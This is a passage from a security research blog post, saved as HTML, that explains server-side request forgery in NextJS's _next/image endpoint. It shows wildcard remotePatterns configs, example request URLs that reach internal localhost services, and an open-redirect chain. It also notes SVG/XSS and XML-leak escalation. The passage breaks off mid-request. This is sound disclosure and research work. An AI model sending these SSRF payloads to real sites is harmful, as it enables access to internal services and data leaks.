<html data-wf-domain="www.assetnote.io" data-wf-page="6439c0491ba631fa66c17340" data-wf-site="6422e507d5004f85d107063a" lang="en" class="w-mod-js w-mod-ix wf-inconsolata-n4-active wf-inconsolata-n7-active wf-active"><head><style>.wf-force-outline-none[tabindex="-1"]:focus{outline:none;}</style><meta charset="utf-8"><title>Digging for SSRF in NextJS apps</title><meta content="At Assetnote, we encounter sites running NextJS extremely often; in this blog post we will detail some common misconfigurations we find in NextJS websites, along with a vulnerability we found in the framework." name="description"><meta content="Digging for SSRF in NextJS apps" property="og:title"><meta content="At Assetnote, we encounter sites running NextJS extremely often; in this blog post we will detail some common misconfigurations we find in NextJS websites, along with a vulnerability we found in the framework." property="og:description"><meta content="" property="og:image"><meta content="Digging for SSRF in NextJS apps" property="twitter:title"><meta content="At Assetnote, we encounter sites running NextJS extremely often; in this blog post we will detail some common misconfigurations we find in NextJS websites, along with a vulnerability we found in the framework." property="twitter:description"><meta content="" property="twitter:image"><meta property="og:type" content="website"><meta content="summary_large_image" name="twitter:card"><meta content="width=device-width, initial-scale=1" name="viewport"><link href="https://cdn.prod.website-files.com/6422e507d5004f85d107063a/css/assetnote.webflow.44a02734f.css" rel="stylesheet" type="text/css"><link href="https://fonts.googleapis.com" rel="preconnect"><link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous"><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/TqxSU0dsOd2Q9IbI7CpFnJLD/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-hPyFRPtmIlZ/h96KCtxJTBIBP3zd59DIienuUS73AMSvQ3kZQSEjuK4A+Lw/BPMn"></script><script type="text/javascript" async="" src="https://s3-us-west-2.amazonaws.com/b2bjsstore/b/L9NMMZH3WMNW/reb2b.js.gz"></script><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/TqxSU0dsOd2Q9IbI7CpFnJLD/recaptcha__pl.js" crossorigin="anonymous" integrity="sha384-EtuwsrUt4o3rjKbOIgbMlrdETicyC7YJiOMF4S2kRPR2c6EcUDPrB1OFkiSEO3IC"></script><script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata:400,700" media="all"><script type="text/javascript">WebFont.load({  google: {    families: ["Inconsolata:400,700"]  }});</script><script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script><link href="https://cdn.prod.website-files.com/6422e507d5004f85d107063a/649c26a2dd142039d6d615af_Frame%201428%20(1).png" rel="shortcut icon" type="image/x-icon"><link href="https://cdn.prod.website-files.com/6422e507d5004f85d107063a/649c2686dd142039d6d5ea8e_Frame%201428.png" rel="apple-touch-icon"><link href="https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps" rel="canonical"><link href="rss.xml" rel="alternate" title="RSS Feed" type="application/rss+xml"><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B9PT68ZLP0"></script><script type="text/javascript">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('set', 'developer_id.dZGVlNj', true);gtag('config', 'G-B9PT68ZLP0');</script><script src="https://www.google.com/recaptcha/api.js" type="text/javascript"></script><!-- Please keep this css code to improve the font quality-->
<style>
  * {
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}
</style>
<!-- Google tag (gtag.js) -->
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B9PT68ZLP0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-B9PT68ZLP0');
</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/http.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
<script>hljs.highlightAll();</script>
<!-- [Attributes by Finsweet] Powerful Rich Text -->
<script defer="" src="https://cdn.jsdelivr.net/npm/@finsweet/attributes-richtext@1/richtext.js"></script>
</head><body><div class="page-wrapper"><div class="global-styles w-embed"><style>

/* Get rid of top margin on first element in any rich text element */
.w-richtext > :not(div):first-child, .w-richtext > div:first-child > :first-child {
  margin-top: 0 !important;
}

/* Get rid of bottom margin on last element in any rich text element */
.w-richtext>:last-child, .w-richtext ol li:last-child, .w-richtext ul li:last-child {
	margin-bottom: 0 !important;
}

/* 
Make the following elements inherit typography styles from the parent and not have hardcoded values. 
Important: You will not be able to style for example "All Links" in Designer with this CSS applied.
Uncomment this CSS to use it in the project. Leave this message for future hand-off.
*/
/*
a,
.w-input,
.w-select,
.w-tab-link,
.w-nav-link,
.w-dropdown-btn,
.w-dropdown-toggle,
.w-dropdown-link {
  color: inherit;
  text-decoration: inherit;
  font-size: inherit;
}
*/

.w-select {
    -webkit-appearance: none;
    -moz-appearance: none;
}

/* Prevent all click and hover interaction with an element */
.pointer-events-off {
	pointer-events: none;
}

/* Enables all click and hover interaction with an element */
.pointer-events-on {
  pointer-events: auto;
}

/* Snippet enables you to add class of div-square which creates and maintains a 1:1 dimension of a div.*/
.div-square::after {
  content: "";
  display: block;
  padding-bottom: 100%;
}

/*Hide focus outline for main content element*/
    main:focus-visible {
    outline: -webkit-focus-ring-color auto 0px;
}

/* Make sure containers never lose their center alignment*/
.container-medium, .container-small, .container-large {
  margin-right: auto !important;
  margin-left: auto !important;
}

/*Reset selects, buttons, and links styles*/
.w-input, .w-select, a {
color: inherit;
text-decoration: inherit;
font-size: inherit;
}

/*Apply "..." after 3 lines of text */
.text-style-3lines {
    display: -webkit-box;
    overflow: hidden;
    -webkit-line-clamp: 3;
    -webkit-box-orient: vertical;
}

/* Apply "..." after 2 lines of text */
.text-style-2lines {
    display: -webkit-box;
    overflow: hidden;
    -webkit-line-clamp: 2;
    -webkit-box-orient: vertical;
}
/* Apply "..." at 100% width */
.truncate-width { 
		width: 100%; 
    white-space: nowrap; 
    overflow: hidden; 
    text-overflow: ellipsis; 
}
/* Removes native scrollbar */
.no-scrollbar {
    -ms-overflow-style: none;  // IE 10+
    overflow: -moz-scrollbars-none;  // Firefox
}

.no-scrollbar::-webkit-scrollbar {
    display: none; // Safari and Chrome
}

/* Adds inline flex display */
.display-inlineflex {
  display: inline-flex;
}

/* These classes are never overwritten */
.hide {
  display: none !important;
}

@media screen and (max-width: 991px) {
    .hide, .hide-tablet {
        display: none !important;
    }
}
  @media screen and (max-width: 767px) {
    .hide-mobile-landscape{
      display: none !important;
    }
}
  @media screen and (max-width: 479px) {
    .hide-mobile{
      display: none !important;
    }
}
 
.margin-0 {
  margin: 0rem !important;
}
  
.padding-0 {
  padding: 0rem !important;
}

.spacing-clean {
padding: 0rem !important;
margin: 0rem !important;
}

.margin-top {
  margin-right: 0rem !important;
  margin-bottom: 0rem !important;
  margin-left: 0rem !important;
}

.padding-top {
  padding-right: 0rem !important;
  padding-bottom: 0rem !important;
  padding-left: 0rem !important;
}
  
.margin-right {
  margin-top: 0rem !important;
  margin-bottom: 0rem !important;
  margin-left: 0rem !important;
}

.padding-right {
  padding-top: 0rem !important;
  padding-bottom: 0rem !important;
  padding-left: 0rem !important;
}

.margin-bottom {
  margin-top: 0rem !important;
  margin-right: 0rem !important;
  margin-left: 0rem !important;
}

.padding-bottom {
  padding-top: 0rem !important;
  padding-right: 0rem !important;
  padding-left: 0rem !important;
}

.margin-left {
  margin-top: 0rem !important;
  margin-right: 0rem !important;
  margin-bottom: 0rem !important;
}
  
.padding-left {
  padding-top: 0rem !important;
  padding-right: 0rem !important;
  padding-bottom: 0rem !important;
}
  
.margin-horizontal {
  margin-top: 0rem !important;
  margin-bottom: 0rem !important;
}

.padding-horizontal {
  padding-top: 0rem !important;
  padding-bottom: 0rem !important;
}

.margin-vertical {
  margin-right: 0rem !important;
  margin-left: 0rem !important;
}
  
.padding-vertical {
  padding-right: 0rem !important;
  padding-left: 0rem !important;
}

</style></div><div data-animation="default" class="navbar7_component w-nav" data-easing2="ease" fs-scrolldisable-element="smart-nav" data-easing="ease" data-collapse="medium" data-w-id="4637a205-a04f-c9cb-b0d2-47c008627e33" role="banner" data-duration="400"><div class="navbar7_container"><a href="/" class="navbar7_logo-link w-nav-brand" aria-label="home"><img src="https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg" loading="lazy" alt="" class="navbar7_logo"></a><nav role="navigation" class="navbar7_menu w-nav-menu"><div class="navbar7_menu-left"><a href="/why-assetnote" class="navbar7_link w-nav-link">Why Assetnote</a><div data-hover="true" data-delay="50" data-w-id="4637a205-a04f-c9cb-b0d2-47c008627f63" class="navbar7_menu-dropdown w-dropdown"><div class="navbar7_dropdown-toggle w-dropdown-toggle" id="w-dropdown-toggle-0" aria-controls="w-dropdown-list-0" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="dropdown-icon w-embed"><svg width=" 100%" height=" 100%" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M2.55806 6.29544C2.46043 6.19781 2.46043 6.03952 2.55806 5.94189L3.44195 5.058C3.53958 4.96037 3.69787 4.96037 3.7955 5.058L8.00001 9.26251L12.2045 5.058C12.3021 4.96037 12.4604 4.96037 12.5581 5.058L13.4419 5.94189C13.5396 6.03952 13.5396 6.19781 13.4419 6.29544L8.17678 11.5606C8.07915 11.6582 7.92086 11.6582 7.82323 11.5606L2.55806 6.29544Z" fill="currentColor"></path>
</svg></div><div>Platform</div></div><nav class="navbar7_dropdown-list w-dropdown-list" style="opacity: 0;" id="w-dropdown-list-0" aria-labelledby="w-dropdown-toggle-0"><div class="navbar7_dropdown-container"><div class="navbar7_dropdown-content"><div class="navbar7_dropdown-content-left"><div><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fb1-08627e33" class="navbar-subheading"><p class="text-size-small text-color-lightgray line-height-1-3">What Powers Our Product</p></div><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fb4-08627e33" class="w-dyn-list"><div role="list" class="navbar7_dropdown-link-list w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="/platform/asset-discovery" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fb8-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Continuous Asset Discovery</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Get an unparalleled view of your environment in real-time</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/platform/asset-enrichment" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fb8-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Deep Asset Enrichment</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Contextualize and track assets as they evolve</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/platform/assetnote-exposure-engine" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fb8-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Assetnote Exposure Engine</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Identify high-signal exposures by the hour</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/platform/expert-security-research" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fb8-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Expert Security Research</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Industry-leading offensive security research at your fingertips</p></div></a></div></div></div></div><div><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fc0-08627e33" class="navbar-subheading"><p class="text-size-small text-color-lightgray line-height-1-3">What Empowers Our Customers</p></div><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fc3-08627e33" class="w-dyn-list"><div role="list" class="navbar7_dropdown-link-list w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="/platform/collaborative-workflows" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fc7-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Collaborative Workflows</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Work together under one platform</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/platform/customization" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-_308f6eae-a974-90a0-8020-92d6d5608fc7-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Customization</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Customize our platform to fit your needs</p></div></a></div></div></div></div></div></div></div></nav></div><div data-hover="true" data-delay="50" data-w-id="b717f28e-5132-17f3-90c5-043c5e407d53" class="navbar7_menu-dropdown w-dropdown"><div class="navbar7_dropdown-toggle w-dropdown-toggle" id="w-dropdown-toggle-1" aria-controls="w-dropdown-list-1" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="dropdown-icon w-embed"><svg width=" 100%" height=" 100%" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M2.55806 6.29544C2.46043 6.19781 2.46043 6.03952 2.55806 5.94189L3.44195 5.058C3.53958 4.96037 3.69787 4.96037 3.7955 5.058L8.00001 9.26251L12.2045 5.058C12.3021 4.96037 12.4604 4.96037 12.5581 5.058L13.4419 5.94189C13.5396 6.03952 13.5396 6.19781 13.4419 6.29544L8.17678 11.5606C8.07915 11.6582 7.92086 11.6582 7.82323 11.5606L2.55806 6.29544Z" fill="currentColor"></path>
</svg></div><div>Use Cases</div></div><nav class="navbar7_dropdown-list w-dropdown-list" id="w-dropdown-list-1" aria-labelledby="w-dropdown-toggle-1"><div class="navbar7_dropdown-container"><div class="navbar7_dropdown-content"><div class="navbar7_dropdown-content-left"><div><div id="w-node-b419e79e-167b-e45e-8788-eb26951c7298-08627e33" class="navbar-subheading"><p class="text-size-small text-color-lightgray line-height-1-3">By Objective</p></div><div id="w-node-b419e79e-167b-e45e-8788-eb26951c729b-08627e33" class="w-dyn-list"><div role="list" class="navbar7_dropdown-link-list w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="/use-cases/continuous-asset-discovery-and-inventory" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-b419e79e-167b-e45e-8788-eb26951c729f-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Continuous Asset Discovery and Inventory</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Stay up-to-date with your evolving attack surface</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/continuous-security-monitoring" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-b419e79e-167b-e45e-8788-eb26951c729f-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Real-Time Exposure Monitoring</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Monitor and get high-signal findings</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/attack-surface-reduction" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-b419e79e-167b-e45e-8788-eb26951c729f-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Attack Surface Reduction</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Understand the full extent of your attack surface to reduce it</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/mergers-and-acquisitions" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-b419e79e-167b-e45e-8788-eb26951c729f-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Mergers &amp; Acquisitions</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Don't inherit exposures of an acquired attack surface</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/bug-bounty-readiness" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-b419e79e-167b-e45e-8788-eb26951c729f-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Bug Bounty Readiness</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Find all the low-hanging fruit for a more effective program</p></div></a></div></div></div></div><div><div id="w-node-b419e79e-167b-e45e-8788-eb26951c72a7-08627e33" class="navbar-subheading"><p class="text-size-small text-color-lightgray line-height-1-3">By Surface</p></div><div class="w-dyn-list"><div role="list" class="navbar7_dropdown-link-list w-dyn-items"><div role="listitem" class="w-dyn-item"><a href="/use-cases/surface-application-infrastructure" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-b419e79e-167b-e45e-8788-eb26951c72ae-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Application &amp; Infrastructure</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Assetnote covers all traditional EASM surfaces</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/surface-cloud-platforms" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-b419e79e-167b-e45e-8788-eb26951c72ae-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Cloud Platforms</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Assetnote secures the cloud platforms you rely on: AWS, GCP, Azure, and more!</p></div></a></div><div role="listitem" class="w-dyn-item"><a href="/use-cases/surface-api-security" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-b419e79e-167b-e45e-8788-eb26951c72ae-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">API Security</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Assetnote secures the API attack surface as it grows</p></div></a></div></div></div></div></div></div></div></nav></div><div data-hover="true" data-delay="50" data-w-id="053a9533-5a0b-0036-81b5-04d8f05a22b8" class="navbar7_menu-dropdown w-dropdown"><div class="navbar7_dropdown-toggle w-dropdown-toggle" id="w-dropdown-toggle-2" aria-controls="w-dropdown-list-2" aria-haspopup="menu" aria-expanded="false" role="button" tabindex="0"><div class="dropdown-icon w-embed"><svg width=" 100%" height=" 100%" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M2.55806 6.29544C2.46043 6.19781 2.46043 6.03952 2.55806 5.94189L3.44195 5.058C3.53958 4.96037 3.69787 4.96037 3.7955 5.058L8.00001 9.26251L12.2045 5.058C12.3021 4.96037 12.4604 4.96037 12.5581 5.058L13.4419 5.94189C13.5396 6.03952 13.5396 6.19781 13.4419 6.29544L8.17678 11.5606C8.07915 11.6582 7.92086 11.6582 7.82323 11.5606L2.55806 6.29544Z" fill="currentColor"></path>
</svg></div><div>Company</div></div><nav class="navbar7_dropdown-list w-dropdown-list" id="w-dropdown-list-2" aria-labelledby="w-dropdown-toggle-2"><div class="navbar7_dropdown-container"><div class="navbar7_dropdown-content"><div class="navbar7_dropdown-content-left"><div class="navbar7_dropdown-link-list"><a href="/company/about-us" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-_03ce372d-7304-5659-3c5d-e2b1bf4da46b-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">About Us</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Learn about who we are and why we do what we do.</p></div></a><a href="/company/careers" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-_03ce372d-7304-5659-3c5d-e2b1bf4da472-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Careers</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Join us in our mission to build awesome security products.</p></div></a><a href="/company/contact" class="navbar7_dropdown-link w-inline-block" tabindex="0"><div id="w-node-_03ce372d-7304-5659-3c5d-e2b1bf4da479-08627e33" class="navbar7_item-text"><div class="font-is-euclid"><div class="line-height-1-2">Contact</div></div><p class="text-size-small text-color-lightgray line-height-1-3">Meet with the Assetnote team and get your questions answered.</p></div></a></div></div></div></div></nav></div><a href="/resources/research" class="navbar7_link w-nav-link">Research</a><a href="https://labs.assetnote.io" target="_blank" class="navbar7_link w-nav-link">Labs</a></div><div class="navbar7_menu-right"><a href="/demo" class="button is-small nav w-button">Request a Demo</a></div></nav><div class="navbar7_menu-button w-nav-button" style="-webkit-user-select: text;" aria-label="menu" role="button" tabindex="0" aria-controls="w-nav-overlay-0" aria-haspopup="menu" aria-expanded="false"><div class="menu-icon"><div data-is-ix2-target="1" class="lottie-animation" data-w-id="07e135ec-2b3b-c52f-e42e-553801b59193" data-animation-type="lottie" data-src="https://cdn.prod.website-files.com/6422e507d5004f85d107063a/6442bdd241e0390aab3ef870_Comp%201.json" data-loop="0" data-direction="1" data-autoplay="0" data-renderer="svg" data-default-duration="2" data-duration="0" data-ix2-initial-state="0"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1000 1000" width="1000" height="1000" style="width: 100%; height: 100%; transform: translate3d(0px, 0px, 0px); content-visibility: visible;" preserveAspectRatio="xMidYMid meet"><defs><clipPath id="__lottie_element_2"><rect width="1000" height="1000" x="0" y="0"></rect></clipPath></defs><g clip-path="url(#__lottie_element_2)"><g style="display: block;" transform="matrix(1,0,0,1,500,581.8679809570312)" opacity="1"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path stroke-linecap="round" stroke-linejoin="round" fill-opacity="0" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="23.116" d=" M-91.5,0 C-91.5,0 0.03099999949336052,0 0.03099999949336052,0 C0.03099999949336052,0 91.5,0 91.5,0"></path></g></g><g style="display: block;" transform="matrix(1,0,0,1,500,500)" opacity="1"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path stroke-linecap="round" stroke-linejoin="round" fill-opacity="0" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="23.116" d=" M-91.5,0 C-91.5,0 91.5,0 91.5,0"></path></g></g><g style="display: block;" transform="matrix(1,0,0,1,500,418.13201904296875)" opacity="1"><g opacity="1" transform="matrix(1,0,0,1,0,0)"><path stroke-linecap="round" stroke-linejoin="round" fill-opacity="0" stroke="rgb(255,255,255)" stroke-opacity="1" stroke-width="23.116" d=" M-91.5,0 C-91.5,0 0,0 0,0 C0,0 91.5,0 91.5,0"></path></g></g></g></svg></div></div></div></div><div class="w-nav-overlay" data-wf-ignore="" id="w-nav-overlay-0"></div></div><main class="main-wrapper"><div class="background-color-black faded"><header class="section_blog-post1-header"><div class="padding-global"><div class="container-large"><div class="padding-section-large"><div class="max-width-large align-center"><div class="blog-post1-header_title-wrapper"><div class="blog-post1-header"><div class="blog-post1-header_breadcrumb"><a href="/resources/research" class="breadcrumb-link on-dark w-inline-block"><div>Research Notes</div></a><div class="breadcrumb-divider w-embed"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M6 3L11 8L6 13" stroke="CurrentColor" stroke-width="1.5"></path>
</svg></div><div href="#" class="breadcrumb-link on-dark"><div>Security Research</div></div></div><div class="text-size-small blog1_date text-color-lightgray">May 9, 2024</div></div><h1 class="heading-style-h2 text-color-purple gradient-text-2">Digging for SSRF in NextJS apps</h1></div><div class="w-condition-invisible"><div class="w-dyn-list"><div class="w-dyn-empty"><div>No items found.</div></div></div></div></div><div class="max-width-large align-center w-condition-invisible"><img src="https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg" loading="lazy" alt=""><div class="text-size-small">Creative Commons license</div></div></div></div></div></header></div><header class="section_blog-post1-content on-dark faded"><div class="padding-global"><div class="container-large"><div class="padding-large"><div class="max-width-large align-center"><div class="blog-post1-content_content"><div fs-richtext-element="rich-text" class="text-rich-text research-notes w-richtext"><p>If you want to design a mostly static, modern landing page for your brand new business, what do you do? Ten years ago, it felt like every company was using a heavyweight CMS like Wordpress. As a hacker, the attack surface of CMS solutions is well understood. It feels like every day that some critical vulnerability is found in a CMS or CMS plugin.</p><p>However, in the modern era, companies are increasingly moving to more lightweight solutions. The past few years has seen an explosion of popularity in 'static' site generators, such as Nuxt, Hugo, and Gatsby. Perhaps the most popular of all is NextJS, which despite often being used for serving simple static content, has a plethora of server side features enabled by default. At Assetnote, we encounter sites running NextJS extremely often; in this blog post we will detail some common misconfigurations we find in NextJS websites, along with a vulnerability we found in the framework.</p><h3>The _next/image Component<br></h3><p>NextJS has an image optimization component <a href="https://nextjs.org/docs/pages/api-reference/components/image">built in</a> and enabled by default. The idea is straightforward; if you have a large image <span class="code_single-line">duck.jpg</span> which you want to serve in a smaller size, or serve in a dynamic size, it would be wasteful to send the (possibly multi megabyte) image to the client and resize it using HTML; instead, you can write something in your React like:</p><div class="w-embed"><pre><code class="language-jsx hljs language-javascript" data-highlighted="yes">&lt;<span class="hljs-title class_">Image</span>
  src=<span class="hljs-string">"/duck.jpg"</span>
  width={<span class="hljs-number">256</span>}
  quality={<span class="hljs-number">75</span>}
  alt=<span class="hljs-string">"Picture of a duck"</span>
/&gt;
</code></pre></div><p>And it will be served to the client at the correct size. In addition, it can be cached, meaning the server does not have to resize the image on every request.</p><p>How does this work behind the scenes? In reality, NextJS exposes an api endpoint <span class="code_single-line">_next/image</span>, which can then be used like follows:</p><div class="w-embed"><pre><code data-highlighted="yes" class="hljs language-bash">https://example.com/_next/image?url=/duck.jpg&amp;w=256&amp;q=75</code></pre></div><p>The Image component simply crafts a request like this and places it inside an ordinary <span class="code_single-line">img</span> tag. When you visit this URL for the first time, NextJS makes a request to <span class="code_single-line">//localhost/duck.jpg</span>, and, assuming an image exists at that url, resizes it using a server side image manipulation library before returning it to the user.</p><p>Of course, it's common to want to serve images from other domains. NextJS provides the <span class="code_single-line">remotePatterns</span> functionality in the <span class="code_single-line">next.config.js</span> file to do just that; by specifying a config item like:</p><div class="w-embed"><pre><code class="language-js hljs language-javascript" data-highlighted="yes">    <span class="hljs-attr">images</span>: {
        <span class="hljs-attr">remotePatterns</span>: [
            {
                <span class="hljs-attr">protocol</span>: <span class="hljs-string">'https'</span>,
                <span class="hljs-attr">hostname</span>: <span class="hljs-string">'cdn.example.com'</span>,
            },
            {
                <span class="hljs-attr">protocol</span>: <span class="hljs-string">'https'</span>,
                <span class="hljs-attr">hostname</span>: <span class="hljs-string">'third-party.com'</span>,
            },
        ],
    },
</code></pre></div><p>You can now load images from <span class="code_single-line">cdn.example.com</span> and <span class="code_single-line">third-party.com</span>:</p><div class="w-embed"><pre><code data-highlighted="yes" class="hljs language-bash">https://example.com/_next/image?url=https://cdn.example.com/i/rabbit.png&amp;w=256&amp;q=75
</code></pre></div><p>If you were a developer and you wanted to load an image from any site, you may simply whitelist every URL:</p><div class="w-embed"><pre><code class="language-js hljs language-javascript" data-highlighted="yes">  <span class="hljs-attr">images</span>: {
    <span class="hljs-attr">remotePatterns</span>: [
		{
			<span class="hljs-attr">protocol</span>: <span class="hljs-string">"https"</span>,
			<span class="hljs-attr">hostname</span>: <span class="hljs-string">"**"</span>,
		},
		{
			<span class="hljs-attr">protocol</span>: <span class="hljs-string">"http"</span>,
			<span class="hljs-attr">hostname</span>: <span class="hljs-string">"**"</span>,
		},
    ],
  },
</code></pre></div><p>This may seem ludicrous, but <a href="https://github.com/search?q=%22hostname%3A+%5C%22**%5C%22%22+path%3Anext.config.js&amp;type=code">it's not that uncommon</a>, especially since it's not clear that this is dangerous. However, this opens you up to a blind SSRF attack - you can simply load any local URL like:</p><div class="w-embed"><pre><code data-highlighted="yes" class="hljs language-bash">https://example.com/_next/image?url=https://localhost:2345/api/v1/x&amp;w=256&amp;q=75</code></pre></div><p>If the upstream response is a valid image, it will be passed to the user. There are a couple of rare conditions that this can be escalated further:</p><p>- If the version of NextJS is old, or <span class="code_single-line">dangerouslyAllowSVG</span> is set to true, you can link to an SVG url hosted on your domain, leading to XSS.</p><p>- If the version of NextJS is old, or <span class="code_single-line">dangerouslyAllowSVG</span> is set to true, you can leak the full content of XML responses via SSRF. This is because NextJS uses sniffing to determine the content type of the response even if a <span class="code_single-line">Content-Type</span> header is provided, and to check for SVG NextJS simply checks the response starts with <span class="code_single-line">&lt;?xml</span>.</p><p>- If any internal host does not respond with a <span class="code_single-line">Content-Type</span>, the full response will also be leaked. This is unlikely but sometimes happens with misconfigured proxies or the like.</p><p>A more common scenario is that some specific domains are whitelisted. However, the image renderer follows redirects. Thus if you were to find any open redirect on a whitelisted domain, you can turn this into a blind SSRF. For example, suppose <span class="code_single-line">third-party.com</span> was whitelisted and you found an open redirect at <span class="code_single-line">third-party.com/logout?url=foo</span>. You could then hit an internal server with SSRF with a request like:</p><div class="w-embed"><pre><code data-highlighted="yes" class="hljs language-perl">https:<span class="hljs-regexp">//</span>example.com/_next/image?url=https:<span class="hljs-regexp">//</span>third-party.com/logout%<span class="hljs-number">3</span>furl%<span class="hljs-number">3</span>Dhttps%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Flocalhost%3A2345%<span class="hljs-number">2</span>Fapi%2Fv1%2Fx&amp;w=<span class="hljs-number">256</span>&amp;<span 